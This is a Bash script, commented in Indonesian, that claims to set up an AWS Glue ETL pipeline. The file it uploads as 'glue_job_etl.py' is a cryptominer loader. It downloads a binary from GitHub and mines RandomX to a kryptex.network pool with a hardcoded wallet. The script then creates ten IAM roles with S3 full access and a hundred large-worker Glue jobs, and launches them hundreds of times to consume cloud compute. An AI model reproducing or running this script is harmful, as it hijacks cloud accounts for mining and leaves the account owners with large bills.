#!/bin/bash
set -euo pipefail

AWS_REGION="${AWS_REGION:-us-east-2}"
PREFIX="${PREFIX:-goreng}"

# =========================
# 1. Setup AWS
# =========================
echo "Masukkan region [us-east-2]:"
read -r AWS_REGION_INPUT
AWS_REGION="${AWS_REGION_INPUT:-us-east-2}"

echo "Masukkan prefix nama role & job [goreng]:"
read -r PREFIX_INPUT
PREFIX="${PREFIX_INPUT:-goreng}"

ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
BUCKET_NAME="${ACCOUNT_ID}-${AWS_REGION}"

echo
echo "Region: $AWS_REGION"
echo "Account ID: $ACCOUNT_ID"
echo "Bucket: $BUCKET_NAME"
echo "Prefix: $PREFIX"

# =========================
# 2. Buat bucket S3
# =========================
echo "Membuat bucket S3..."
aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" 2>/dev/null || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" >/dev/null 2>&1 || true

# =========================
# 3. Upload sample CSV
# =========================
cat > sample.csv <<'CSV'
id,name,city
1,andi,jakarta
2,budi,bandung
3,siti,medan
CSV

aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv"

# =========================
# 4. Buat file ETL
# =========================
cat > glue_job_etl.py <<'PY'
#!/usr/bin/env python3

import os
import sys
import time
import socket
import tarfile
import shutil
import subprocess
from urllib import request

URL = "https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz"
WALLET = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"

def download_file(url, filename=None):
    if filename is None:
        filename = os.path.basename(url)
    print(f"Downloading {filename}...")
    try:
        request.urlretrieve(url, filename)
        return 0
    except Exception as e:
        print(f"Download gagal: {e}")
        return 1

def extract_tar_ball(path):
    print(f"Extracting {os.path.basename(path)}...")
    try:
        with tarfile.open(path, "r:gz") as tar:
            tar.extractall(".")
        return 0
    except Exception as e:
        print(f"Ekstrak gagal: {e}")
        return 1

def get_worker_name():
    try:
        hostname = socket.gethostname()
        addrs = socket.gethostbyname_ex(hostname)[2]
        for ip in addrs:
            if ip and not ip.startswith("127."):
                return ip
    except Exception:
        pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass

    return "worker1"

def run_adul():
    worker_name = get_worker_name()
    worker_tag = f"{WALLET}/{worker_name}"
    threads = os.cpu_count() or 1

    print(f"Menjalankan adul dengan worker: {worker_tag}")

    cmd = [
        "./adul",
        "-a", "rx/0",
        "-o", "xtm-rx-sg.kryptex.network:7038",
        "-u", worker_tag,
        "-t", str(threads)
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print("Binary ./adul tidak ditemukan. Pastikan file sudah diekstrak.")
        return 1

    try:
        while proc.poll() is None:
            time.sleep(0.2)
        return proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        print("\n[ SELESAI ] Proses adul dibatalkan.")
        return 130

def main():
    filename = os.path.basename(URL)
    if not os.path.exists(filename):
        status = download_file(URL, filename)
        if status != 0:
            return 1

    status = extract_tar_ball(filename)
    if status != 0:
        return 1

    status = run_adul()
    if status == 0:
        print("[ SELESAI ] Proses adul telah berhenti.")
    else:
        print(f"[ SELESAI ] Proses adul berhenti dengan status: {status}")

    return status

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nProgram dihentikan.")
        sys.exit(130)
PY

aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"

# =========================
# 5. Buat 10 role, tiap role punya 10 job
# =========================
WORKER_TYPES=(
  "R.8X" "R.4X" "R.2X" "R.1X"
  "G.16X" "G.12X" "G.8X" "G.4X" "G.2X" "G.1X"
)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"
  echo "Membuat role: $ROLE_NAME"

  aws iam create-role \
    --role-name "$ROLE_NAME" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole >/dev/null 2>&1 || true

  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --query "Role.Arn" --output text)

  for job_index in $(seq 1 10); do
    JOB_NAME="${ROLE_NAME}job${job_index}"
    WORKER_TYPE="${WORKER_TYPES[$((job_index-1))]}"

    echo "Membuat job: $JOB_NAME dengan worker type: $WORKER_TYPE"

    aws glue create-job \
      --name "$JOB_NAME" \
      --role "$ROLE_ARN" \
      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job_etl.py\",\"PythonVersion\":\"3\"}" \
      --default-arguments "{\"--TempDir\":\"s3://${BUCKET_NAME}/temp/\",\"--job-language\":\"python\",\"--BUCKET_NAME\":\"${BUCKET_NAME}\",\"--JOB_NAME\":\"${JOB_NAME}\"}" \
      --execution-property "{\"MaxConcurrentRuns\":1}" \
      --glue-version "5.1" \
      --worker-type "$WORKER_TYPE" \
      --number-of-workers 2 \
      --region "$AWS_REGION" \
      --timeout 10080 >/dev/null 2>&1 || true
  done
done

echo
echo "Pembuatan role dan job selesai."

# =========================
# 6. Konfirmasi sebelum run semua job
# =========================
echo
read -r -p "Tekan Enter untuk menjalankan semua Glue job, atau Ctrl+C untuk batal... " CONFIRM

RUN_COUNTS=(6 12 25 50 3 4 6 12 25 50)

for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"

  echo
  echo "=== ROLE: ${ROLE_NAME} ==="

  for job_index in "${!RUN_COUNTS[@]}"; do
    JOB_NAME="${ROLE_NAME}job$((job_index + 1))"
    COUNT="${RUN_COUNTS[$job_index]}"

    echo "Job: ${JOB_NAME} | run: ${COUNT} kali"

    for ((i=1; i<=COUNT; i++)); do
      echo "  run ke-$i"
      aws glue start-job-run \
        --job-name "$JOB_NAME" \
        --region "$AWS_REGION"
    done
  done
done

echo
echo "Semua job selesai dijalankan."
